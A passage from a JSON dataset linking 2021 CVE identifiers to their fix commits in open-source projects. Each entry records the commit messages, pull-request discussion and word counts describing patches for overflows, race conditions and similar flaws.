https://nvd.nist.gov/vuln/detail/CVE-2021-3878 Here's the thing - while it is in fact an XML vulnerability, it is an\nextremely rare set of circumstances which leads to it actually causing a\nvulnerability for anyone.  The standard CoreNLP server does not expose\neither class in any way.  The AceReader is part of the deterministic coref,\nbut the xml files it reads are server side.  At no point does it read a\nuser supplied xml file.  SSurgeon is actually just not used anywhere (in\nsoftware that we release, at least), which is a shame since it is a really\ncool system.\n\nSomeone would have had to have made a version of coref which accepts user\nsupplied xml for the config, or an annotator which uses SSurgeon and\naccepts outside patterns to apply, and after doing that they would have to\nset up CoreNLP as a server and accept connections from the outside world.\nOtherwise this change does not actually affect anyone's security situation.",
            "pr_title_words": 6,
            "comments_words": 315,
            "total_other_info_words": 321
        },
        {
            "cve-id": "CVE-2021-43814",
            "commit_url": "https://github.com/rizinorg/rizin/commit/aa6917772d2f32e5a7daab25a46c72df0b5ea406",
            "commit_msg": "Fix oob write for dwarf with abbrev with count 0 (Fix #2083) (#2086)",
            "commit_msg_words": 13,
            "other_info": "Fix oob write for dwarf with abbrev with count 0 (Fix #2083)",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2021-24031",
            "commit_url": "https://github.com/facebook/zstd/commit/3968160a916a759c3d3418da533e1b4f8b795343",
            "commit_msg": "[programs] set chmod 600 after opening destination file\n\nThis resolves a race condition where zstd or unzstd may expose read\npermissions beyond the original file allowed.  Mode 600 is used\ntemporarily during the compression and decompression write stage\nand the new file inherits the original file\u2019s mode at the end.\n\nFixes #1630",
            "commit_msg_words": 52,
            "other_info": "[programs] set chmod 600 after opening destination file Thank you for your pull request and welcome to our community. We require contributors to sign our Contributor License Agreement, and we don't seem to have you on file. In order for us to review and merge your code, please sign up at https://code.facebook.com/cla. **If you are contributing on behalf of someone else (eg your employer)**, the individual CLA may not be sufficient and your employer may need the corporate CLA signed.\n\nIf you have received this in error or have any questions, please contact us at [cla@fb.com](mailto:cla@fb.com?subject=CLA%20for%20facebook%2Fzstd%20%231644). Thanks! Thank you for signing our Contributor License Agreement. We can now accept your code for this (and any) Facebook open source project. Thanks! Thanks @chungy .\r\nThankfully, we have automated Windows tests, using both `mingw` and Visual Studio.\r\nIt seems your patch passed them, which suggests compilation (at least) works fine.\r\n\r\n`chmod` is a Unix command, but it seems to have a corresponding Windows hook.\r\nWe already use it in multiple other places, so if it was a bad thing, we would have already triggered some bug reports.\r\n\r\nAlso, it would have been great if it was possible to ship a test case alongside the patch, as to ensure the property remains verified after future changes. However, I must admit I'm completely out of idea on how to test this specific property (using a reasonably simple test).\r\n\r\ncc @felixhandte for the review. I wonder about the race condition that is potentially introduced here, where `zstd` first opens a file with liberal permissions, and then closes them down. It seems like a malicious process could open the file during that gap and then read the contents as they are written.\r\n\r\nAn alternative approach would be to temporarily set the process umask to `umask | 00077`, do the open, and then restore the original umask. It seems though that windows does not have an equivalent of umask, so that approach would be less portable.\r\n\r\nWhat do you think? I believe this patch solves the more pressing issue of ensuring that the temporary file cannot be read during compression, which is a long time compared to the very tiny window of opportunity between file creation and rights setting.\r\nAlso, this simple patch does not introduce additional dependencies nor portability complexity. This PR causes an unexpected change in 1.4.2 and 1.4.1 (compared to 1.4.0 and before): if compressing from stdin to a file, the file always has final rights 0600 instead of umask. This breaks a lot of code I fear.\r\nExample:\r\n\r\n    echo \"123456789\" | zstd -14 -f -q -o test.zst\r\n\r\n Possible workaround: use shell redirection (`zstd > test.zst`) instead of `-o test.zst`\r\n\r\nThough yes, it is a new bug and you should file a regular issue on it so it doesn't become forgotten in this merged PR :)",
            "pr_title_words": 8,
            "comments_words": 464,
            "total_other_info_words": 472
        },
        {
            "cve-id": "CVE-2021-35346",
            "commit_url": "https://github.com/justdan96/tsMuxer/commit/df7c4ef77136b5aeb07e5ddde1699decc6029951",
            "commit_msg": "[Bug] Buffer overflow with non-hevc stream\n\nAs per T-REC-H265 standard sub-clause 7.4.2.2., when nal_unit_type == VPS_NUT or SPS_NUT or EOS_NUT or EOB_NUT, nuh_temporal_id shall be equal to 0.\r\n\r\nThis patch allows early return when this condition is not fulfilled therefore the stream is obviously not hevc.\r\n\r\nFixes issues #418 and #420.",
            "commit_msg_words": 51,
            "other_info": "[Bug] Buffer overflow with non-hevc stream",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-29442",
            "commit_url": "https://github.com/alibaba/nacos/commit/bffd440297618d189a7c8cac26191147d763cc6f",
            "commit_msg": "fix derbyOps interface security problem",
            "commit_msg_words": 5,
            "other_info": "[ISSUE #4463] fix derbyOps interface security problem",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-22572",
            "commit_url": "https://github.com/google/data-transfer-project/commit/013edb6c2d5a4e472988ea29a7cb5b1fdaf9c635",
            "commit_msg": "Switch to using Files.createTempFile",
            "commit_msg_words": 4,
            "other_info": "Switch to using Files.createTempFile",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-31406",
            "commit_url": "https://github.com/vaadin/flow/commit/3fe644cab2cffa5b86316dbe71b11df1083861a9",
            "commit_msg": "Use time-constant comparison for CSRF tokens in endpoint",
            "commit_msg_words": 8,
            "other_info": "Use time-constant comparison for CSRF tokens in endpoint",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-29470",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/6628a69c036df2aa036290e6cd71767c159c79ed",
            "commit_msg": "Add more bounds checks in Jp2Image::encodeJp2Header",
            "commit_msg_words": 6,
            "other_info": "Add more bounds checks in Jp2Image::encodeJp2Header",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-45860",
            "commit_url": "https://github.com/justdan96/tsMuxer/commit/f6c5c618236709f5b76425d9cd407a27dc49f4ba",
            "commit_msg": "[bug] Fix integer overflow\n\nFixes issue #510.",
            "commit_msg_words": 7,
            "other_info": "[bug] Fix integer overflow",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-31571",
            "commit_url": "https://github.com/FreeRTOS/FreeRTOS-Kernel/commit/47338393f1f79558f6144213409f09f81d7c4837",
            "commit_msg": "add assert for addition overflow on queue creation (#225)",
            "commit_msg_words": 9,
            "other_info": "add assert for addition overflow on queue creation",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-45960",
            "commit_url": "https://github.com/libexpat/libexpat/commit/0adcb34c49bee5b19bd29b16a578c510c23597ea",
            "commit_msg": "lib: Detect and prevent troublesome left shifts in function storeAtts (CVE-2021-45960)",
            "commit_msg_words": 11,
            "other_info": "[CVE-2021-45960] lib: Detect and prevent troublesome left shifts in function storeAtts (fixes #531) @hartwork is there any ETA to merge this PR? @kraptor in a few days, followed by release 2.4.3 There is more security work upcoming for 2.4.3; I personally recommend waiting for release 2.4.3, and then acting on all vulnerabilities at once.",
            "pr_title_words": 13,
            "comments_words": 41,
            "total_other_info_words": 54
        },
        {
            "cve-id": "CVE-2021-4040",
            "commit_url": "https://github.com/apache/activemq-artemis/commit/153d2e9a979aead8dff95fbc91d659ecc7d0fb82",
            "commit_msg": "ARTEMIS-3593 Defense against OME on parsing XID\n\nCo-authored-by: Viktor Kolomeyko <Viktor.Kolomeyko@r3.com>",
            "commit_msg_words": 11,
            "other_info": "ARTEMIS-3593 Defense against OME on parsing XID Looks fine to me. @clebertsuconic - many thanks for integrating this fix.\r\nDo you have an ETA when a new version is likely to be cut with this fix included? @clebertsuconic - I can see this fix has now been released as part of Artemis 2.20 release and published to Maven Central recently. Thanks for that!\r\n\r\nI also note that version 2.20 comes with JRE upgrade from 1.8 to Java 11 as per [ARTEMIS-3420](https://issues.apache.org/jira/projects/ARTEMIS/issues/ARTEMIS-3420).\r\n\r\nUnfortunately, for our product we still use Java 1.8 and upgrading to Java 11 is a bigger deal.\r\n\r\nWould it be possible to port this fix to version 2.19 and include it into 2.19.1 for example?",
            "pr_title_words": 7,
            "comments_words": 110,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2021-21429",
            "commit_url": "https://github.com/OpenAPITools/openapi-generator/commit/34002dc1d4b1f9e1c741cab32f9249b361ead6df",
            "commit_msg": "use Files.createTempFile in maven plugin to avoid security issues",
            "commit_msg_words": 9,
            "other_info": "[maven plugin] fix security issues",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-26197",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/39b9e47d503eac26fc1649396d0bd13aa46a2ec5",
            "commit_msg": "Fix unavailable source file handling in main_print_unhandled_exception\n\nThis patch fixes #4403.\n\nJerryScript-DCO-1.0-Signed-off-by: Robert Fancsik frobert@inf.u-szeged.hu",
            "commit_msg_words": 15,
            "other_info": "Fix unavailable source file handling in main_print_unhandled_exception",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-45290",
            "commit_url": "https://github.com/WebAssembly/binaryen/commit/859d8996d68b5d279712172669c216569398ae97",
            "commit_msg": "fix",
            "commit_msg_words": 1,
            "other_info": "Add binary format parse checking for ref.as input type",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-22547",
            "commit_url": "https://github.com/GoogleCloudPlatform/iot-device-sdk-embedded-c/commit/46cccccb7bf94d935890a177f6160ede91780ef3",
            "commit_msg": "calloc limits",
            "commit_msg_words": 2,
            "other_info": "calloc limits",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-32845",
            "commit_url": "https://github.com/moby/hyperkit/commit/41272a980197917df8e58ff90642d14dec8fe948",
            "commit_msg": "Fix vtrnd pci_vtrnd_notify uninitialized memory use (GHSL-2021-056)\n\nSigned-off-by: Frederic Dalleau <frederic.dalleau@docker.com>",
            "commit_msg_words": 11,
            "other_info": "Various fixes",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-46879",
            "commit_url": "https://github.com/fluent/fluent-bit/commit/75f0e0e5f7267682674029820524d22460f498b0",
            "commit_msg": "flb_pack: fix OSS-Fuzz issue 5076752961110016\n\nSigned-off-by: davkor <david@adalogics.com>",
            "commit_msg_words": 8,
            "other_info": "pack-gelf: fix OSS-Fuzz issue 5076752961110016 thanks",
            "pr_title_words": 5,
            "comments_words": 1,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-3751",
            "commit_url": "https://github.com/bfabiszewski/libmobi/commit/ab5bf0e37e540eac682a14e628853b918626e72b",
            "commit_msg": "fix oob write bug inside libmobi",
            "commit_msg_words": 6,
            "other_info": "fix oob write vulnerabilities inside libmobi Thanks for catching this!",
            "pr_title_words": 6,
            "comments_words": 4,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2021-31294",
            "commit_url": "https://github.com/redis/redis/commit/6cbea7d29b5285692843bc1c351abba1a7ef326f",
            "commit_msg": "Prevent replicas from sending commands that interact with keyspace (#8868)\n\nThis solves an issue reported in #8712 in which a replica would bypass\r\nthe client write pause check and cause an assertion due to executing a\r\nwrite command during failover.\r\n\r\nThe fact is that we don't expect replicas to execute any command other\r\nthan maybe REPLCONF and PING, etc. but matching against the ADMIN\r\ncommand flag is insufficient, so instead i just block keyspace access\r\nfor now.\n\n(cherry picked from commit 46f4ebbe842620f0976a36741a72482620aa4b48)",
            "commit_msg_words": 82,
            "other_info": "Release 6.2.3",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-26826",
            "commit_url": "https://github.com/godotengine/godot/commit/403e4fd08b0b212e96f53d926e6273e0745eaa5a",
            "commit_msg": "Fix a crash in the TGA loader with malformed input",
            "commit_msg_words": 10,
            "other_info": "Fix a crash in the TGA loader with malformed input Thanks a lot to Carlos Ramirez Catano for reporting this bug. Attached are the files that show the issue.\r\n[poc-input.zip](https://github.com/godotengine/godot/files/5925645/poc-input.zip)\r\n Thanks! Thank you guys for the quick response. This issue needed immediate attention.\r\nKeep up the good work. For the reference, the bug fixed by this PR was assigned those two CVEs:\r\n\r\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26825\r\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26826 Hello @hpvb @akien-mga \r\nAs Godot Engine is a leading open source project for game development, I was thinking it would be appropriate to provide some additional assurance to the community regarding quality and security best practices of the project. Recently, this is a key factor for companies/development teams when choosing their technology stack.\r\n\r\nAs an initial step the project could adopt something like https://securitytxt.org, do and document security reviews and other activities.\r\n\r\nWhat do you think?\r\nI am myself willing to support these initiatives.\r\nLooking forward to hear your thoughts.\r\n @CarlosAndresRamirez As an update, we deployed `security.txt` on the Godot website: https://github.com/godotengine/godot-website/pull/332\r\n\r\nWe're also adding a dedicated security contact email: https://github.com/godotengine/godot-website/pull/365",
            "pr_title_words": 10,
            "comments_words": 167,
            "total_other_info_words": 177
        },
        {
            "cve-id": "CVE-2021-21430",
            "commit_url": "https://github.com/OpenAPITools/openapi-generator/commit/2c576483f26f85b3979c6948a131f585c237109a",
            "commit_msg": "use Files.createTempFile",
            "commit_msg_words": 2,
            "other_info": "[Java] use Files.createTempFile instead Hi @wing328  \r\n\r\nCurrently we are using openapi-generator 4.3.1, and when downloading JAVA SDK for endpoints with PDF files, we couldn't observe any temporary files in `/tmp` or` var/tmp ` folder. Could you please tell me how we can reproduce this issue ? please try the latest stable version v5.3.1 instead and open a new issue for tracking if you need help from the community. yes with stable version v5.3.1 we have no issues. I just want to analyze this issue in my environment with the previous versions. Could you please let me know the steps to reproduce this in previous versions ? the issue was reported by a user and he didn't provide details on how exactly he uncovered the issue.",
            "pr_title_words": 4,
            "comments_words": 121,
            "total_other_info_words": 125
        },
        {
            "cve-id": "CVE-2021-43518",
            "commit_url": "https://github.com/teeworlds/teeworlds/commit/91e5492d4c210f82f1ca6b43a73417fef5463368",
            "commit_msg": "hotfix CVE-2021-43518",
            "commit_msg_words": 2,
            "other_info": "Hotfix CVE-2021-43518 I'm confused, why wasn't this released? > I'm confused, why wasn't this released?\r\n\r\nI guess because the proper fix it still a work in progress in https://github.com/teeworlds/teeworlds/pull/2931 I don't understand the point of a *hotfix* if it isn't meant to be released immediately while the proper fix is in progress. > I don't understand the point of a _hotfix_ if it isn't meant to be released immediately while the proper fix is in progress.\r\n\r\nSafety for developers and others who build from source :D\r\nBut yea I guess you have a point here.",
            "pr_title_words": 2,
            "comments_words": 93,
            "total_other_info_words": 95
        },
        {
            "cve-id": "CVE-2021-45890",
            "commit_url": "https://github.com/AuthGuard/AuthGuard/commit/9783b1143da6576028de23e15a1f198b1f937b82",
            "commit_msg": "Prevent authentication with inactive identifiers",
            "commit_msg_words": 5,
            "other_info": "Prevent authentication using inactive identifiers",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-36148",
            "commit_url": "https://github.com/projectacrn/acrn-hypervisor/commit/25c0e3817eb332660dd63d1d4522e63dcc94e79a",
            "commit_msg": "hv: validate input for dmar_free_irte function\n\n Malicious input 'index' may trigger buffer\n overflow on array 'irte_alloc_bitmap[]'.\n\n This patch validate that 'index' shall be\n less than 'CONFIG_MAX_IR_ENTRIES' and also\n remove unnecessary check on 'index' in\n 'ptirq_free_irte()' function with this fix.\n\nTracked-On: #6132\nSigned-off-by: Yonghua Huang <yonghua.huang@intel.com>",
            "commit_msg_words": 45,
            "other_info": "hv: refine input validation on vlapic_write() and dmar_free_irte() No new violations to the coding guideline detected.<br>No New Name Conflict<br>No New Function Declaration/Definition Mismatch try verify ldra No new violations to the coding guideline detected.<br>No New Name Conflict<br>No New Function Declaration/Definition Mismatch",
            "pr_title_words": 8,
            "comments_words": 33,
            "total_other_info_words": 41
        },
        {
            "cve-id": "CVE-2021-21309",
            "commit_url": "https://github.com/redis/redis/commit/c992857618db99776917f10bf4f2345a5fdc78b0",
            "commit_msg": "Fix integer overflow (CVE-2021-21309). (#8522)\n\nOn 32-bit systems, setting the proto-max-bulk-len config parameter to a high value may result with integer overflow and a subsequent heap overflow when parsing an input bulk (CVE-2021-21309).\n\nThis fix has two parts:\n\nSet a reasonable limit to the config parameter.\nAdd additional checks to prevent the problem in other potential but unknown code paths.\n\n(cherry picked from commit d32f2e9999ce003bad0bd2c3bca29f64dcce4433)",
            "commit_msg_words": 65,
            "other_info": "Release 6.0.11",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-31616",
            "commit_url": "https://github.com/keepkey/keepkey-firmware/commit/e49d45594002d4d3fbc1f03488e6dfc0a0a65836",
            "commit_msg": "710 merge",
            "commit_msg_words": 2,
            "other_info": "710 merge",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-3139",
            "commit_url": "https://github.com/open-iscsi/tcmu-runner/commit/2b16e96e6b63d0419d857f53e4cc67f0adb383fd",
            "commit_msg": "tcmur: fail cross-device XCOPY requests\n\ntcmu-runner can't determine whether the device(s) referred to in XCOPY\nCopy Source/Copy Destination (CSCD) descriptors should be accessible to\nthe initiator via transport settings, ACLs, etc. Consequently, fail\nXCOPY requests with CSCD descriptors which refer to any device other\nthan where the XCOPY request is processed.\n\nReferences: CVE-2020-28374\nFixes: 9c86bd0 (\"tcmur: Add emulate XCOPY command support\")\nSigned-off-by: David Disseldorp <ddiss@suse.de>\nReviewed-by: Lee Duncan <lduncan@suse.com>",
            "commit_msg_words": 69,
            "other_info": "tcmur: fail cross-device XCOPY requests JFYI, @msmeissn mentioned that there's a new CVE number to track this separate to the Linux kernel fix:\r\n\r\n> For tcmu-runner Mitre suggested that we use a different CVE as its not the same codebase.\r\n> Please use CVE-2021-3139 for tcmu-runner.",
            "pr_title_words": 5,
            "comments_words": 41,
            "total_other_info_words": 46
        },
        {
            "cve-id": "CVE-2021-42073",
            "commit_url": "https://github.com/debauchee/barrier/commit/229abab99f39f11624e5651f819e7f1f8eddedcc",
            "commit_msg": "Implement client identity verification\n\nThis commit fixes two security vulnerabilities: CVE-2021-42072 and\nCVE-2021-42073.\n\nThe issues have been reported by Matthias Gerstner <mgerstner@suse.de>.",
            "commit_msg_words": 22,
            "other_info": "Implement client identity verification [SECURITY VULNERABILITIES CVE-2021-42072, CVE-2021-42073]",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-38388",
            "commit_url": "https://github.com/line/centraldogma/commit/6a395aed73f0b009cf8174a3ebf3ed826521c11d",
            "commit_msg": "Prohibit mirroing to internal repositories\nMotivation:\nWe should prohibit mirroring to internal repositories which can cause a security incident.\n\nModifcations:\n- Raise an exception if the `localRepo` of mirroring setting is one of `meta` and `dogma` which are internal repositories.\n\nResult:\n- You cannot setup mirroring to internal repositories anymore.",
            "commit_msg_words": 50,
            "other_info": "Prohibit mirroring to internal repositories # [Codecov](https://codecov.io/gh/line/centraldogma/pull/621?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) Report\n> Merging [#621](https://codecov.io/gh/line/centraldogma/pull/621?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) (e83b558) into [master](https://codecov.io/gh/line/centraldogma/commit/ed507c70c9e25cfaff4bee25050aca06b12b4843?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) (ed507c7) will **increase** coverage by `0.12%`.\n> The diff coverage is `75.75%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/line/centraldogma/pull/621/graphs/tree.svg?width=650&height=150&src=pr&token=5LAOnnwLyE&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line)](https://codecov.io/gh/line/centraldogma/pull/621?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line)\n\n```diff\n@@             Coverage Diff              @@\n##             master     #621      +/-   ##\n============================================\n+ Coverage     69.79%   69.91%   +0.12%     \n- Complexity     3262     3276      +14     \n============================================\n  Files           331      331              \n  Lines         12988    13020      +32     \n  Branches       1396     1402       +6     \n============================================\n+ Hits           9065     9103      +38     \n+ Misses         3062     3056       -6     \n  Partials        861      861              \n```\n\n\n| [Impacted Files](https://codecov.io/gh/line/centraldogma/pull/621?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) | Coverage \u0394 | |\n|---|---|---|\n| [...rnal/storage/repository/DefaultMetaRepository.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-c2VydmVyL3NyYy9tYWluL2phdmEvY29tL2xpbmVjb3JwL2NlbnRyYWxkb2dtYS9zZXJ2ZXIvaW50ZXJuYWwvc3RvcmFnZS9yZXBvc2l0b3J5L0RlZmF1bHRNZXRhUmVwb3NpdG9yeS5qYXZh) | `86.77% <\u00f8> (\u00f8)` | |\n| [...erver/internal/thrift/CentralDogmaServiceImpl.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-c2VydmVyL3NyYy9tYWluL2phdmEvY29tL2xpbmVjb3JwL2NlbnRyYWxkb2dtYS9zZXJ2ZXIvaW50ZXJuYWwvdGhyaWZ0L0NlbnRyYWxEb2dtYVNlcnZpY2VJbXBsLmphdmE=) | `74.65% <62.50%> (-0.59%)` | :arrow_down: |\n| [...raldogma/server/internal/api/ContentServiceV1.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-c2VydmVyL3NyYy9tYWluL2phdmEvY29tL2xpbmVjb3JwL2NlbnRyYWxkb2dtYS9zZXJ2ZXIvaW50ZXJuYWwvYXBpL0NvbnRlbnRTZXJ2aWNlVjEuamF2YQ==) | `84.49% <80.00%> (-1.09%)` | :arrow_down: |\n| [...ient/armeria/legacy/LegacyCentralDogmaBuilder.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y2xpZW50L2phdmEtYXJtZXJpYS1sZWdhY3kvc3JjL21haW4vamF2YS9jb20vbGluZWNvcnAvY2VudHJhbGRvZ21hL2NsaWVudC9hcm1lcmlhL2xlZ2FjeS9MZWdhY3lDZW50cmFsRG9nbWFCdWlsZGVyLmphdmE=) | `81.48% <0.00%> (-3.71%)` | :arrow_down: |\n| [...al/storage/repository/cache/CachingRepository.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-c2VydmVyL3NyYy9tYWluL2phdmEvY29tL2xpbmVjb3JwL2NlbnRyYWxkb2dtYS9zZXJ2ZXIvaW50ZXJuYWwvc3RvcmFnZS9yZXBvc2l0b3J5L2NhY2hlL0NhY2hpbmdSZXBvc2l0b3J5LmphdmE=) | `89.31% <0.00%> (+0.76%)` | :arrow_up: |\n| [...internal/storage/DirectoryBasedStorageManager.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-c2VydmVyL3NyYy9tYWluL2phdmEvY29tL2xpbmVjb3JwL2NlbnRyYWxkb2dtYS9zZXJ2ZXIvaW50ZXJuYWwvc3RvcmFnZS9EaXJlY3RvcnlCYXNlZFN0b3JhZ2VNYW5hZ2VyLmphdmE=) | `65.06% <0.00%> (+0.87%)` | :arrow_up: |\n| [.../centraldogma/internal/client/AbstractWatcher.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y2xpZW50L2phdmEvc3JjL21haW4vamF2YS9jb20vbGluZWNvcnAvY2VudHJhbGRvZ21hL2ludGVybmFsL2NsaWVudC9BYnN0cmFjdFdhdGNoZXIuamF2YQ==) | `80.68% <0.00%> (+2.75%)` | :arrow_up: |\n| [...a/server/internal/api/HttpApiExceptionHandler.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-c2VydmVyL3NyYy9tYWluL2phdmEvY29tL2xpbmVjb3JwL2NlbnRyYWxkb2dtYS9zZXJ2ZXIvaW50ZXJuYWwvYXBpL0h0dHBBcGlFeGNlcHRpb25IYW5kbGVyLmphdmE=) | `84.00% <0.00%> (+4.00%)` | :arrow_up: |\n| [...ogma/client/armeria/CentralDogmaEndpointGroup.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y2xpZW50L2phdmEtYXJtZXJpYS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9jZW50cmFsZG9nbWEvY2xpZW50L2FybWVyaWEvQ2VudHJhbERvZ21hRW5kcG9pbnRHcm91cC5qYXZh) | `65.38% <0.00%> (+7.69%)` | :arrow_up: |\n| [...aldogma/client/armeria/CompositeEndpointGroup.java](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y2xpZW50L2phdmEtYXJtZXJpYS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9jZW50cmFsZG9nbWEvY2xpZW50L2FybWVyaWEvQ29tcG9zaXRlRW5kcG9pbnRHcm91cC5qYXZh) | `100.00% <0.00%> (+18.75%)` | :arrow_up: |\n| ... and [1 more](https://codecov.io/gh/line/centraldogma/pull/621/diff?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/line/centraldogma/pull/621?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/line/centraldogma/pull/621?src=pr&el=footer&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line). Last update [ed507c7...e83b558](https://codecov.io/gh/line/centraldogma/pull/621?src=pr&el=lastupdated&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line).\n Thanks for reviewing. \ud83d\ude09",
            "pr_title_words": 5,
            "comments_words": 223,
            "total_other_info_words": 228
        },
        {
            "cve-id": "CVE-2021-27433",
            "commit_url": "https://github.com/ARMmbed/mbed-os/commit/151ebfcfc9f2383ee11ce3c771c3bf92900d6b43",
            "commit_msg": "Add integer overflow check to the malloc wrappers\n\nAdd a check that the combined size of the buffer to allocate and\nalloc_info_t does not exceed the maximum integer value representable\nby size_t.",
            "commit_msg_words": 32,
            "other_info": "Add integer overflow check to the malloc wrappers @LDong-Arm, thank you for your changes.\n@evedon @donatieng @ARMmbed/mbed-os-maintainers please review. We should schedule 5.15 jobs after we close the next 6.x release # [Test run: FAILED](https://jenkins-mbedos.oss.arm.com/job/mbed-os-ci-lts-pr/job/PR-14408/1/) \nSummary: 1 of 10 test jobs failed \nBuild number : 1 \n[Build artifacts](http://mbed-os-ci-public.s3-website-eu-west-1.amazonaws.com/?prefix=jenkins-ci/ARMmbed/mbed-os/mbed-os-ci-lts-pr/PR-14408/artifacts/14408/) \n \nFailed test jobs:\n - jenkins-ci/mbed-os-ci_greentea-test-lts\n The failures don't look related to this PR, but I can check on my local K64F and DISCO_L475VG_IOT01A (I don't have a NUCLEO_F429ZI). CI restarted # [Test run: FAILED](https://jenkins-mbedos.oss.arm.com/job/mbed-os-ci-lts-pr/job/PR-14408/2/) \nSummary: 1 of 10 test jobs failed \nBuild number : 2 \n[Build artifacts](http://mbed-os-ci-public.s3-website-eu-west-1.amazonaws.com/?prefix=jenkins-ci/ARMmbed/mbed-os/mbed-os-ci-lts-pr/PR-14408/artifacts/14408/) \n \nFailed test jobs:\n - jenkins-ci/mbed-os-ci_greentea-test-lts\n I locally checked on a K64F - the TLS socket test failures have nothing to do with this PR.\r\nIt also fails on mbed-os-5.15.6 - did it pass during the previous release? Does this test also exist in the mbed-os-6.x.x release workflow?\r\nIf it did pass last time, the failures could be related to the server this test suite talks to? CI restarted > I locally checked on a K64F - the TLS socket test failures have nothing to do with this PR.\r\n> It also fails on mbed-os-5.15.6 - did it pass during the previous release? Does this test also exist in the mbed-os-6.x.x release workflow?\r\n> If it did pass last time, the 